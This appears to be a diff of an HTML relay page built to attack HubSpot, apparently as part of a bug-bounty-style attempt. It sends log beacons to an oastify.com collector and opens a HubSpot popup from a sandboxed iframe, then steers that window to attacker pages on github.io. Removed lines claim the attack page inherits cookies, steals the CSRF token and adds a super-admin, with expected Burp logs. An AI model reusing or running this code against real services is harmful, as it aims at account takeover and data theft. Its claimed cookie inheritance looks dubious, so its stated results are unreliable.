@@ -2,8 +2,9 @@
 <html>
 <head><title>Relay</title></head>
 <body>
-<h1>Relay</h1>
+<h1>Relay Page</h1>
 <div id="status"></div>
+
 <script>
 const EXFIL = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';
 
@@ -12,117 +13,80 @@ function log(msg) {
     new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
 }
 
+log('relay_loaded');
+
+// Listen for start command
 window.addEventListener('message', function(e) {
     if (e.data && e.data.action === 'startExploit') {
-        log('TRIGGERED');
+        log('received_start_command');
         
-        const blob = new Blob([`
-<html>
-<body>
-<h2>Executing Attack</h2>
-<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;"></div>
-<script>
-const E = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';
-
-function l(m) { 
-    document.getElementById('log').innerHTML += '<br>' + m;
-}
-
-l('START_origin=' + window.origin);
-l('opening_hubspot');
-
-// Open HubSpot to establish authenticated session
-let hub = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');
-
-if (!hub) {
-    l('ERROR_popup_blocked');
-} else {
-    l('popup_opened');
-    
-    let attempts = 0;
-    let checkInterval = setInterval(() => {
-        attempts++;
-        
-        try {
-            // Try to access origin - will throw when cross-origin
-            hub.origin;
-            
-            if (attempts % 20 === 0) {
-                l('waiting_' + attempts);
-            }
-        } catch(e) {
-            // Cross-origin = HubSpot loaded
-            clearInterval(checkInterval);
-            l('hubspot_loaded_after_' + attempts);
-            
-            // Wait a bit more for full initialization
-            setTimeout(() => {
-                l('navigating_to_attack_page');
-                
-                // Navigate the authenticated popup to our attack page on GitHub
-                hub.location = 'https://majdch22.github.io/attack.html';
-                
-                l('navigation_complete');
-                
-            }, 2000);
-        }
-        
-        if (attempts > 150) {
-            clearInterval(checkInterval);
-            l('timeout');
-        }
-    }, 100);
-}
-<\/script>
-</body>
-</html>
-        `], {type: 'text/html'});
-        
-        const blobUrl = URL.createObjectURL(blob);
-        
+        // Create sandboxed iframe
         const iframe = document.createElement('iframe');
         iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
-        iframe.src = blobUrl;
-        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
         
+        // Use srcdoc (inherits parent origin but sandbox makes it null)
+        iframe.srcdoc = `
+            <h2>Sandbox</h2>
+            <div id="log"></div>
+            <script>
+                function log(msg) {
+                    document.getElementById('log').innerHTML += '<br>' + msg;
+                }
+                
+                log('Sandbox loaded');
+                log('Origin: ' + window.origin);
+                
+                // Open HubSpot popup
+                log('Opening HubSpot...');
+                const hub = window.open('https://app-eu1.hubspot.com', 'hubspot_window');
+                
+                if (!hub) {
+                    log('ERROR: Popup blocked');
+                } else {
+                    log('Popup opened successfully');
+                    
+                    // Wait for it to load
+                    setTimeout(() => {
+                        log('Setting window.name');
+                        
+                        // Set a marker in window.name
+                        hub.name = 'exploited_' + Date.now();
+                        
+                        log('Name set to: ' + hub.name);
+                        
+                        // Navigate to contacts page
+                        log('Navigating to contacts...');
+                        hub.location = 'https://app-eu1.hubspot.com/contacts/146256700';
+                        
+                        // After navigation, window.name should persist
+                        setTimeout(() => {
+                            log('Checking name after navigation...');
+                            log('Current name: ' + hub.name);
+                            
+                            // Navigate to our collector
+                            setTimeout(() => {
+                                log('Navigating to collector');
+                                hub.location = 'https://majdch22.github.io/data-collector.html';
+                            }, 3000);
+                            
+                        }, 3000);
+                        
+                    }, 3000);
+                }
+            <\/script>
+        `;
+        
+        iframe.style.cssText = 'width:100%;height:400px;border:2px solid red';
         document.body.appendChild(iframe);
-        log('iframe_added');
+        
+        log('sandbox_iframe_created');
     }
 });
 
-if(window.opener) {
-    window.opener.postMessage({status:'ready'},'*');
+// Tell opener we're ready
+if (window.opener) {
+    window.opener.postMessage({status: 'ready'}, '*');
 }
 </script>
 </body>
 </html>
-```
-
----
-
-## **How This Works:**
-
-1. ✅ Sandbox iframe opens **authenticated HubSpot popup**
-2. ✅ Waits for HubSpot to load
-3. ✅ **Navigates popup to `https://majdch22.github.io/attack.html`**
-4. ✅ Attack page **inherits HubSpot cookies** from the navigation
-5. ✅ Reads `hubspotapi-csrf` from `document.cookie`
-6. ✅ Makes API call to add user **with CSRF token**
-7. ✅ **You become super-admin!**
-
----
-
-## **Expected Burp Logs:**
-```
-/?a=1_attack_page_loaded
-/?a=2_origin=https://majdch22.github.io
-/?a=3_referrer=https://app-eu1.hubspot.com
-/?a=4_cookie_length=5000+         ← Cookies inherited!
-/?a=5_cookies_found
-/?a=6_csrf_found=AAccUfv...
-/?a=7_payload_prepared
-/?a=8_calling_api
-/?a=9_response_status=200         ← SUCCESS!
-/?a=SUCCESS_status_200
-/?a=10_response={"users":[...]}
-/?a=USER_ADDED_SUCCESSFULLY       ← YOU'RE NOW ADMIN!
